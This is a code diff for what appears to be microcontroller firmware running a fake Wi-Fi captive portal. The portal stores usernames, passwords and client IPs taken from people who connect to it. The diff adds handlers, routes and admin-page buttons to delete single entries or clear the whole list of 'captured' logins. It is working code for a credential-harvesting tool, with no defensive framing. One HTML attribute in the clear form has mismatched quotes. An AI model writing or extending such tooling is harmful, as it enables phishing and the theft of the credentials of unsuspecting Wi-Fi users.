@@ -262,6 +262,63 @@ namespace
     return ok;
   }
 
+  bool deleteCapturedCredentialByIndex(size_t index)
+  {
+    if (!LittleFS.exists(capturedCredentialsPath))
+    {
+      return false;
+    }
+
+    File file = LittleFS.open(capturedCredentialsPath, "r");
+    if (!file)
+    {
+      return false;
+    }
+
+    JsonDocument doc;
+    DeserializationError error = deserializeJson(doc, file);
+    file.close();
+
+    if (error || !doc.is<JsonArray>())
+    {
+      return false;
+    }
+
+    JsonArray entries = doc.as<JsonArray>();
+    if (index >= entries.size())
+    {
+      return false;
+    }
+
+    entries.remove(index);
+
+    File out = LittleFS.open(capturedCredentialsPath, "w");
+    if (!out)
+    {
+      return false;
+    }
+
+    bool ok = serializeJson(doc, out) > 0;
+    out.close();
+    return ok;
+  }
+
+  bool clearCapturedCredentials()
+  {
+    JsonDocument doc;
+    doc.to<JsonArray>();
+
+    File out = LittleFS.open(capturedCredentialsPath, "w");
+    if (!out)
+    {
+      return false;
+    }
+
+    bool ok = serializeJson(doc, out) > 0;
+    out.close();
+    return ok;
+  }
+
   String buildCapturedCredentialsTable()
   {
     if (!LittleFS.exists(capturedCredentialsPath))
@@ -295,7 +352,8 @@ namespace
     html += "<thead><tr><th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Usuario</th>";
     html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Senha</th>";
     html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>IP</th>";
-    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Uptime</th></tr></thead><tbody>";
+    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Uptime</th>";
+    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Acao</th></tr></thead><tbody>";
 
     for (size_t i = entries.size(); i > 0; i--)
     {
@@ -304,17 +362,68 @@ namespace
       String password = item["password"] | "";
       String ip = item["client_ip"] | "-";
       unsigned long capturedAt = item["captured_at_ms"] | 0;
+      size_t entryIndex = i - 1;
 
       html += "<tr>";
       html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(username) + "</td>";
       html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(password) + "</td>";
       html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(ip) + "</td>";
       html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + String(capturedAt) + " ms</td>";
+      html += "<td style='padding:8px;border-bottom:1px solid #262626'>";
+      html += "<form method='post' action='/credentials/delete' onsubmit=\"return confirm('Apagar este login?')\">";
+      html += "<input type='hidden' name='index' value='" + String(entryIndex) + "'>";
+      html += "<button type='submit' style='margin:0;padding:6px 10px;border-radius:8px;border:0;background:#8b2d2d;color:#fff;cursor:pointer'>Apagar</button>";
+      html += "</form></td>";
       html += "</tr>";
     }
 
     html += "</tbody></table></div>";
     return html;
+  }
+
+  void handleDeleteCapturedCredential()
+  {
+    if (!server.hasArg("index"))
+    {
+      server.send(400, "text/plain; charset=utf-8", "Indice obrigatorio");
+      return;
+    }
+
+    String rawIndex = server.arg("index");
+    for (size_t i = 0; i < rawIndex.length(); i++)
+    {
+      if (!isDigit(rawIndex[i]))
+      {
+        server.send(400, "text/plain; charset=utf-8", "Indice invalido");
+        return;
+      }
+    }
+
+    size_t index = static_cast<size_t>(strtoul(rawIndex.c_str(), nullptr, 10));
+    bool ok = deleteCapturedCredentialByIndex(index);
+
+    if (!ok)
+    {
+      server.send(400, "text/plain; charset=utf-8", "Falha ao apagar credencial");
+      return;
+    }
+
+    server.sendHeader("Location", "/admin", true);
+    server.send(303, "text/plain", "");
+  }
+
+  void handleClearCapturedCredentials()
+  {
+    bool ok = clearCapturedCredentials();
+
+    if (!ok)
+    {
+      server.send(500, "text/plain; charset=utf-8", "Falha ao limpar credenciais");
+      return;
+    }
+
+    server.sendHeader("Location", "/admin", true);
+    server.send(303, "text/plain", "");
   }
 
   String buildWifiSelectOptions()
@@ -635,7 +744,7 @@ namespace
     String page;
     page += "<!doctype html><html><head><meta charset='utf-8'>";
     page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
+    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .danger{background:#8b2d2d}.ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
     page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
     page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
     page += "<p class='muted'>Seguranca AP: ";
@@ -678,6 +787,8 @@ namespace
     page += "<p class='muted'>API: /api/status</p>";
     page += "</div>";
     page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
+    page += "<form method='post' action='/credentials/clear' onsubmit=\"return confirm('Apagar TODOS os logins salvos?')\'>";
+    page += "<button class='danger' type='submit'>Apagar todos os logins</button></form>";
     page += credentialsTable;
     page += "</div></body></html>";
 
@@ -810,6 +921,8 @@ namespace
     server.on("/status", HTTP_GET, handleStatusPage);
     server.on("/api/status", HTTP_GET, handleStatusJson);
     server.on("/save", HTTP_POST, handleSave);
+    server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
+    server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
     server.onNotFound([]()
                       {
       if (captivePortalEnabled)
